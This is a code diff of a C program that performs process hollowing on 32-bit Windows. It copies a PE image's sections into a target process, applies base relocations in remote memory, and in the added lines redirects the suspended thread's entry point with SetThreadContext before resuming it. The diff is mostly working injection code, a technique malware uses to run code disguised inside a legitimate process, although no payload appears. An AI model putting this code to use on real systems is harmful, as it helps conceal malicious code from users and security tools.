@@ -270,8 +270,9 @@ int wmain()
 	for (Section = 0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++, srcImageSection++)
 	{
 		WriteProcessMem(target, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress), (PVOID)((BYTE*)srcBuffer + srcImageSection->PointerToRawData), srcImageSection->SizeOfRawData, NULL);
-		printf("[+] Written Section = *\n"); 
+		printf("[+] Writing  Section %s to @0x%x\n",srcImageSection->Name, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress));
 	}
+	srcImageSection--; /*saving last section for relocation*/
 #ifdef DEBUG
 	printf("[+] Sections Copied successfully\n");
 #endif
@@ -289,25 +290,22 @@ int wmain()
 	DWORD offset_block = 0; 
 #ifdef DEBUG
 	printf("[+] Relocation log : \n\t relocAddress = %x\n",relocAddress);
+	Sleep(5000); 
 #endif
 	 srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
-	for(int Section=0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++,srcImageSection++){
-
-		char* SectionNam = ".reloc"; 
-
-		if (!((DWORD)srcBuffer + srcImageSection->Name, SectionNam,5)) {
-			continue; 
-		}
-		printf("found reloc section\n"); 
+	 
 		while (offset_block < relocData.Size) /*iterating over HeaderBlocks*/
 		{
 			PBASE_RELOCATION_BLOCK Blockheader = (PBASE_RELOCATION_BLOCK)((DWORD)srcBuffer + relocAddress + offset_block);
 			offset_block += sizeof(BASE_RELOCATION_BLOCK);
-			printf("first block size = %x\n", Blockheader->BlockSize);
+#ifdef DEBUG
+			printf("[+] Block size = %x\n", Blockheader->BlockSize);
+#endif
 			DWORD N_Entries = (Blockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
-			printf("entries = %x\n", N_Entries);
-			printf("[+] offset block = %x", offset_block);
-
+#ifdef DEBUG
+			printf("[+] Number of entries = %x\n", N_Entries);
+			//Sleep(5000);
+#endif
 			PBASE_RELOCATION_ENTRY First_Block = (PBASE_RELOCATION_ENTRY)((BYTE*)srcBuffer + relocAddress + offset_block);
 
 			for (DWORD X = 0; X < N_Entries; X++) /*iterating over entries*/
@@ -320,7 +318,7 @@ int wmain()
 					ReadProcessMem(target, (BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset, &value, sizeof(value), NULL);
 					value += Diff;
 #ifdef DEBUG
-					printf("\tRelocating Address %x -> %x\n", value - Diff, value);
+					printf("\tRelocating Address 0x%x -> %x\n", value - Diff, value);
 #endif
 					if (!WriteProcessMem(target, (BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset, &value, sizeof(value), NULL))
 					{
@@ -332,5 +330,11 @@ int wmain()
 			}
 		}
 
+
+		CONTEXT ctx ;
+		ctx.ContextFlags = CONTEXT_INTEGER; 
+		GetThreadContext(blah1.hThread, &ctx);
+		ctx.Eax = (DWORD)TargetImageBase + srcNtHeaders->OptionalHeader.AddressOfEntryPoint;
+		SetThreadContext(blah1.hThread,&ctx);
+		ResumeThread(blah1.hThread); 
 	}
-}
